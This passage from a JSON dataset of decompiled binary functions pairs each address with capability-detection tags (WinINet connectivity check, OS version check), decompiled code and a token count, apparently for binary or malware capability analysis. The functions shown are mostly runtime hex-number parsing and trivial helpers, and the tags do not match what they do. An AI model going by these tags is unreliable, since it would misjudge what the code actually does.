fcn.004032d3(uVar14);\n    *(unaff_EBP + -4) = 0;\n    piVar6 = fcn.00405466(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0xa8) = piVar6;\n    fcn.00405146();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x578000)(unaff_EBP + -0x7c);\n    (*pcVar3)();\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.004032d3(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.0040347c(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405146();\n    pcVar3 = *(*piVar6 + 0x2c);\n    (**0x578000)(\"0123456789ABCDEFabcdef-+XxPp\", 0x5548ad, unaff_EBP + -0x4c);\n    (*pcVar3)();\n    uVar14 = *(unaff_EBP + -0x84);\n    puVar15 = *(unaff_EBP + -0x9c);\n    *(unaff_EBP + -0x7e) = 0;\n    cVar4 = fcn.00401a8c(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar15 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405d21();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x004719c3;\n            *puVar15 = 0x2d;\n        }\n        puVar15 = puVar15 + 1;\n        fcn.00404863();\n    }\ncode_r0x004719c3:\n    *puVar15 = 0x7830;\n    puVar15 = puVar15 + 1;\n    *(unaff_EBP + -0x7d) = 0;\n    *(unaff_EBP + -0x98) = puVar15;\n    *(unaff_EBP + -0x90) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    cVar4 = fcn.00401a8c(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        if (*(iVar2 + 6) == *(unaff_EBP + -0x4c)) {\n            fcn.00404863();\n            cVar4 = fcn.00401a8c(uVar14);\n            if (cVar4 == '\\0') {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405d21();\n                }\n                iVar10 = *(iVar2 + 6);\n                if (iVar10 != *(unaff_EBP + -0x1a)) {\n                    if (*(iVar2 + 4) == '\\0') {\n                        fcn.00405d21();\n                        iVar10 = *(iVar2 + 6);\n                    }\n                    if (iVar10 != *(unaff_EBP + -0x1c)) goto code_r0x00471a4d;\n                }\n                fcn.00404863();\n            }\n            else {\ncode_r0x00471a4d:\n                *(unaff_EBP + -0x7d) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0xa0) = ((**(unaff_EBP + -0xac) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x7c;\n    *(unaff_EBP + -0x94) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x68)) {\n        pcVar12 = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x94) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar4 = fcn.00401a8c(uVar14);\n        if (cVar4 == '\\0') {\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405d21();\n                }\n                uVar7 = fcn.00405650(unaff_EBP + -0x4c, *(iVar2 + 6));\n                if (0x15 < uVar7) break;\n                iVar13 = *(unaff_EBP + -0x90);\n                if (*(unaff_EBP + -0xa0) == iVar13 || *(unaff_EBP + -0xa0) < iVar13) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar13 != 0)) {\n                    *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x90) = iVar13 + 1;\n                }\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.00404863();\n                cVar4 = fcn.00401a8c(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x98) = puVar15;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x6c) == 0) {\n            *(unaff_EBP + -0x88) = 0;\n        }\n        else {\n            uVar7 = fcn.004017d0();\n            *(unaff_EBP + -0x88) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0xf;\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040664a(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar13 = 0;\n        cVar4 = fcn.00401a8c(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x50);\n            iVar8 = *(unaff_EBP + -100);\ncode_r0x00471c0c:\n            do {\n                pcVar12 = *(unaff_EBP + -0x94);\n                while( true ) {\n                    if ((iVar13 == 0) || (cVar4 = *pcVar12,  cVar4 == '\\x7f')) goto code_r0x00471c83;\n                    iVar13 = iVar13 + -1;\n                    if (iVar13 != 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 != *(*(unaff_EBP + -0x88) + iVar13)) goto code_r0x00471c7f;\n                    }\n                    if (iVar13 == 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 < **(unaff_EBP + -0x88)) goto code_r0x00471c7f;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x94) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x94) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405d21();\n            }\n            uVar7 = fcn.00405650(unaff_EBP + -0x4c, *(iVar2 + 6));\n            if (uVar7 < 0x16) {\n                iVar8 = *(unaff_EBP + -0x90);\n                *(unaff_EBP + -0x7d) = 1;\n                if (*(unaff_EBP + -0xa0) == iVar8 || *(unaff_EBP + -0xa0) < iVar8) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x98) = puVar15;\n                    *(unaff_EBP + -0x90) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -100;\n                if (0xf < *(unaff_EBP + -0x50)) {\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (*(iVar8 + iVar13) != '\\x7f') {\n                    iVar8 = unaff_EBP + -100;\n                    if (0xf < *(unaff_EBP + -0x50)) {\n                        iVar8 = *(unaff_EBP + -100);\n                    }\n                    *(iVar8 + iVar13) = *(iVar8 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x50);\n                iVar8 = *(unaff_EBP + -100);\n                iVar11 = unaff_EBP + -100;\n                if (0xf < uVar7) {\n                    iVar11 = iVar8;\n                }\n                if ((*(iVar11 + iVar13) == '\\0') || (*(unaff_EBP + -0x88) == 0)) goto code_r0x00471bef;\n                iVar10 = *(iVar2 + 6);\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405d21();\n                    iVar10 = *(iVar2 + 6);\n                    uVar7 = *(unaff_EBP + -0x50);\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (iVar10 != *(unaff_EBP + -0x88)) goto code_r0x00471bef;\n                fcn.00404543(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.00404863();\n            cVar4 = fcn.00401a8c(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        uVar7 = *(unaff_EBP + -0x50);\n        iVar8 = *(unaff_EBP + -100);\ncode_r0x00471bef:\n        if (iVar13 == 0) goto code_r0x00471c0c;\n        iVar11 = unaff_EBP + -100;\n        if (0xf < uVar7) {\n            iVar11 = iVar8;\n        }\n        if ('\\0' < *(iVar11 + iVar13)) {\n            iVar13 = iVar13 + 1;\n            goto code_r0x00471c0c;\n        }\ncode_r0x00471c7f:\n        *(unaff_EBP + -0x7e) = 1;\ncode_r0x00471c83:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x94) = iVar8;\n            *(unaff_EBP + -0x88) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.0040411a(unaff_EBP + -0x94, unaff_EBP + -0x88);\n                iVar8 = *(unaff_EBP + -0x94);\n            }\n            fcn.00401a2d(iVar8);\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if ((*(unaff_EBP + -0x7d) != '\\0') && (*(unaff_EBP + -0x90) == 0)) {\n        *puVar15 = 0x30;\n        puVar15 = puVar15 + 1;\n        *(unaff_EBP + -0x98) = puVar15;\n    }\n    cVar4 = fcn.00401a8c(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        iVar10 = *(iVar2 + 6);\n        iVar5 = fcn.0040621c();\n        if (iVar10 == iVar5) {\n            puVar9 = fcn.00401357();\n            *puVar15 = **puVar9;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x98) = puVar15;\n            fcn.00404863();\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if (*(unaff_EBP + -0x90) == 0) {\n        cVar4 = fcn.00401a8c(uVar14);\n        if (cVar4 == '\\0') {\n            iVar13 = *(unaff_EBP + -0x8c);\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405d21();\n                }\n                if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                iVar13 = iVar13 + -1;\n                fcn.00404863();\n                cVar4 = fcn.00401a8c(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x8c) = iVar13;\n            puVar15 = *(unaff_EBP + -0x98);\n        }\n        iVar13 = *(unaff_EBP + -0x8c);\n        if (iVar13 < 0) {\n            *puVar15 = 0x30;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x8c) = iVar13 + 1;\n        }\n    }\n    while (cVar4 = fcn.00401a8c(uVar14),  cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        uVar7 = fcn.00405650(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) break;\n        iVar13 = *(unaff_EBP + -0x90);\n        if (iVar13 < *(unaff_EBP + -0xa0)) {\n            *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x90) = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.00404863();\n    }\n    cVar4 = *(unaff_EBP + -0x7d);\n    puVar16 = puVar15;\n    if (cVar4 == '\\0') goto code_r0x00471fd9;\n    cVar4 = fcn.00401a8c(uVar14);\n    if (cVar4 != '\\0') {\ncode_r0x00471fd6:\n        cVar4 = *(unaff_EBP + -0x7d);\ncode_r0x00471fd9:\n        if ((*(unaff_EBP + -0x7e) != '\\0') || (cVar4 == '\\0')) {\n            puVar16 = *(unaff_EBP + -0x9c);\n        }\n        puVar9 = *(unaff_EBP + -0xac);\n        uVar14 = *(unaff_EBP + -0x8c);\n        *puVar16 = 0;\n        *puVar9 = uVar14;\n        fcn.00402a0e();\n        fcn.004068fc();\n        return;\n    }\n    if (*(iVar2 + 4) == '\\0') {\n        fcn.00405d21();\n    }\n    iVar10 = *(iVar2 + 6);\n    if (iVar10 != *(unaff_EBP + -0x16)) {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405d21();\n            iVar10 = *(iVar2 + 6);\n        }\n        if (iVar10 != *(unaff_EBP + -0x18)) goto code_r0x00471fd6;\n    }\n    *puVar15 = 0x70;\n    puVar16 = puVar15 + 1;\n    fcn.00404863();\n    *(unaff_EBP + -0x7d) = 0;\n    iVar13 = 0;\n    cVar4 = fcn.00401a8c(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar16 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405d21();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x00471f31;\n            *puVar16 = 0x2d;\n        }\n        puVar16 = puVar15 + 1;\n        fcn.00404863();\n    }\ncode_r0x00471f31:\n    cVar4 = fcn.00401a8c(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        do {\n            cVar1 = *(iVar2 + 4);\n            cVar4 = *(unaff_EBP + -0x7d);\n            *(unaff_EBP + -0x7d) = cVar4;\n            if (cVar1 == '\\0') {\n                fcn.00405d21();\n                cVar4 = *(unaff_EBP + -0x7d);\n            }\n            if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) {\n                if (cVar4 == '\\0') goto code_r0x00471f88;\n                break;\n            }\n            *(unaff_EBP + -0x7d) = 1;\n            fcn.00404863();\n            cVar4 = fcn.00401a8c(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        *puVar16 = 0x30;\n        puVar16 = puVar16 + 1;\n    }\ncode_r0x00471f88:\n    do {\n        cVar4 = fcn.00401a8c(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') goto code_r0x00471fd6;\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        uVar7 = fcn.00405650(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) goto code_r0x00471fd6;\n        if (iVar13 < 8) {\n            *puVar16 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n            puVar16 = puVar16 + 1;\n            iVar13 = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.00404863();\n    } while( true );\n}\n",
        "token_count": 5359
    },
    "004065fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004065fa(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00404999(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.0040117c(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 436
    },
    "00406627": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406627(uint arg_8h)\n\n{\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    for (iStack28 = 0x52; 0 < iStack28; iStack28 = iStack28 + -1) {\n    }\n    for (iStack32 = 0x1b; 0 < iStack32; iStack32 = iStack32 + -1) {\n    }\n    for (iStack36 = 0x52; 0 < iStack36; iStack36 = iStack36 + -1) {\n    }\n    fcn.00403b02(&arg_8h);\n    return;\n}\n",
        "token_count": 160
    },
    "00406640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406640(int32_t param_1)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(param_1 + 4) == 0) {\n        var_ch = 0x544a21;\n    }\n    else {\n        var_ch = fcn.00403e95();\n    }\n    return var_ch;\n}\n",
        "token_count": 89
    },
    "00406695": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406695(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 0x24) != 0) {\n        fcn.00405f24(0, *(arg_8h + 0x24));\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040669a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_15h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid __cdecl fcn.0040669a(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    int32_t unaff_EBP;\n    ushort *puVar12;\n    ushort *puVar13;\n    int32_t iVar14;\n    uint uVar15;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_15h;\n    uint var_4h;\n    \n    fcn.00405434(0x88);\n    iVar14 = *(unaff_EBP + 0x18);\n    iVar11 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0xc);\n    uVar15 = *(iVar14 + 0x30);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = iVar11;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x1c);\n    fcn.004032d3(uVar15);\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00406433(unaff_EBP + -0x7c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x8c) = piVar5;\n    fcn.00405146();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x578000)(unaff_EBP + -0x60);\n    (*pcVar1)();\n    uVar15 = *(iVar14 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.004032d3(uVar15);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.00403616(unaff_EBP + -0x7c);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405146();\n    pcVar1 = *(*piVar5 + 0x1c);\n    (**0x578000)(0x553e04, 0x553e21, unaff_EBP + -0x30);\n    (*pcVar1)();\n    uVar15 = *(unaff_EBP + -0x68);\n    puVar12 = *(unaff_EBP + -0x88);\n    *(unaff_EBP + -99) = 0;\n    cVar2 = fcn.00404011(uVar15);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(iVar11 + 5);\n        if (cVar2 == *(unaff_EBP + -0x19)) {\n            *puVar12 = 0x2b;\n        }\n        else {\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(iVar11 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x1a)) goto code_r0x00467511;\n            *puVar12 = 0x2d;\n        }\n        puVar12 = puVar12 + 1;\n        fcn.00401c7b();\n    }\ncode_r0x00467511:\n    *puVar12 = 0x7830;\n    puVar12 = puVar12 + 1;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x84) = puVar12;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x6c) = 0;\n    cVar2 = fcn.00404011(uVar15);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        if (*(iVar11 + 5) == *(unaff_EBP + -0x30)) {\n            fcn.00401c7b();\n            cVar2 = fcn.00404011(uVar15);\n            if (cVar2 == '\\0') {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                cVar2 = *(iVar11 + 5);\n                if (cVar2 != *(unaff_EBP + -0x17)) {\n                    if (*(iVar11 + 4) == '\\0') {\n                        fcn.004019e7();\n                        cVar2 = *(iVar11 + 5);\n                    }\n                    if (cVar2 != *(unaff_EBP + -0x18)) goto code_r0x0046758f;\n                }\n                fcn.00401c7b();\n            }\n            else {\ncode_r0x0046758f:\n                *(unaff_EBP + -0x61) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0x90) = ((**(unaff_EBP + -0x94) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar10 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x74) = pcVar10;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar10 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x74) = pcVar10;\n    }\n    if ((*pcVar10 == '\\x7f') || (*pcVar10 < '\\x01')) {\n        cVar2 = fcn.00404011(uVar15);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                uVar6 = fcn.00402784(unaff_EBP + -0x30, *(iVar11 + 5));\n                if (0x15 < uVar6) break;\n                iVar14 = *(unaff_EBP + -0x70);\n                if (*(unaff_EBP + -0x90) == iVar14 || *(unaff_EBP + -0x90) < iVar14) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                }\n                else if ((uVar6 != 0) || (iVar14 != 0)) {\n                    *puVar12 = *(uVar6 + 0x553e04);\n                    puVar12 = puVar12 + 1;\n                    *(unaff_EBP + -0x70) = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.00401c7b();\n                cVar2 = fcn.00404011(uVar15);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x84) = puVar12;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x62) = 0;\n        }\n        else {\n            uVar3 = fcn.0040596b();\n            *(unaff_EBP + -0x62) = uVar3;\n        }\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040664a(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar14 = 0;\n        uVar6 = fcn.00404011(*(unaff_EBP + -0x68));\n        if (uVar6 != '\\0') {\n            uVar6 = *(unaff_EBP + -0x34);\n            iVar7 = *(unaff_EBP + -0x48);\ncode_r0x0046772a:\n            do {\n                pcVar10 = *(unaff_EBP + -0x74);\n                while( true ) {\n                    if ((iVar14 == 0) || (cVar2 = *pcVar10,  cVar2 == '\\x7f')) goto code_r0x00467784;\n                    iVar14 = iVar14 + -1;\n                    if (iVar14 != 0) {\n                        *(unaff_EBP + -0x78) = unaff_EBP + -0x48;\n                        if (0xf < uVar6) {\n                            *(unaff_EBP + -0x78) = iVar7;\n                        }\n                        iVar11 = *(unaff_EBP + -0x80);\n                        if (cVar2 != *(*(unaff_EBP + -0x78) + iVar14)) goto code_r0x00467780;\n                    }\n                    if (iVar14 == 0) {\n                        *(unaff_EBP + -0x78) = unaff_EBP + -0x48;\n                        if (0xf < uVar6) {\n                            *(unaff_EBP + -0x78) = iVar7;\n                        }\n                        iVar11 = *(unaff_EBP + -0x80);\n                        if (cVar2 < **(unaff_EBP + -0x78)) goto code_r0x00467780;\n                    }\n                    pcVar10 = *(unaff_EBP + -0x74) + 1;\n                    if (*pcVar10 < '\\x01') break;\n                    *(unaff_EBP + -0x74) = pcVar10;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar11 + 4) == '\\0') {\n                uVar6 = fcn.004019e7();\n            }\n            uVar6 = uVar6 & 0xffffff00 | *(iVar11 + 5);\n            *(unaff_EBP + -0x78) = uVar6;\n            uVar6 = fcn.00402784(unaff_EBP + -0x30, uVar6);\n            if (uVar6 < 0x16) {\n                iVar7 = *(unaff_EBP + -0x70);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x90) == iVar7 || *(unaff_EBP + -0x90) < iVar7) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                }\n                else if ((uVar6 != 0) || (iVar7 != 0)) {\n                    *puVar12 = *(uVar6 + 0x553e04);\n                    puVar12 = puVar12 + 1;\n                    *(unaff_EBP + -0x84) = puVar12;\n                    *(unaff_EBP + -0x70) = iVar7 + 1;\n                }\n                iVar7 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar7 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar7 + iVar14) != '\\x7f') {\n                    iVar7 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar7 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar7 + iVar14) = *(iVar7 + iVar14) + '\\x01';\n                }\n            }\n            else {\n                uVar6 = *(unaff_EBP + -0x34);\n                iVar7 = *(unaff_EBP + -0x48);\n                iVar9 = unaff_EBP + -0x48;\n                if (0xf < uVar6) {\n                    iVar9 = iVar7;\n                }\n                if ((*(iVar9 + iVar14) == '\\0') || (*(unaff_EBP + -0x62) == '\\0')) goto code_r0x0046770d;\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar2 = *(iVar11 + 5);\n                    uVar6 = *(unaff_EBP + -0x34);\n                    iVar7 = *(unaff_EBP + -0x48);\n                }\n                else {\n                    cVar2 = *(unaff_EBP + -0x78);\n                }\n                if (cVar2 != *(unaff_EBP + -0x62)) goto code_r0x0046770d;\n                fcn.00404543(0);\n                iVar14 = iVar14 + 1;\n            }\n            fcn.00401c7b();\n            uVar6 = fcn.00404011(*(unaff_EBP + -0x68));\n        } while (uVar6 == '\\0');\n        uVar6 = *(unaff_EBP + -0x34);\n        iVar7 = *(unaff_EBP + -0x48);\ncode_r0x0046770d:\n        if (iVar14 == 0) goto code_r0x0046772a;\n        iVar9 = unaff_EBP + -0x48;\n        if (0xf < uVar6) {\n            iVar9 = iVar7;\n        }\n        if ('\\0' < *(iVar9 + iVar14)) {\n            iVar14 = iVar14 + 1;\n            goto code_r0x0046772a;\n        }\ncode_r0x00467780:\n        *(unaff_EBP + -99) = 1;\ncode_r0x00467784:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar6) {\n            *(unaff_EBP + -0x74) = iVar7;\n            *(unaff_EBP + -0x78) = uVar6 + 1;\n            if (0xfff < uVar6 + 1) {\n                fcn.0040411a(unaff_EBP + -0x74, unaff_EBP + -0x78);\n                iVar7 = *(unaff_EBP + -0x74);\n            }\n            fcn.00401a2d(iVar7);\n        }\n        uVar15 = *(unaff_EBP + -0x68);\n    }\n    if ((*(unaff_EBP + -0x61) != '\\0') && (*(unaff_EBP + -0x70) == 0)) {\n        *puVar12 = 0x30;\n        puVar12 = puVar12 + 1;\n        *(unaff_EBP + -0x84) = puVar12;\n    }\n    cVar2 = fcn.00404011(uVar15);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(iVar11 + 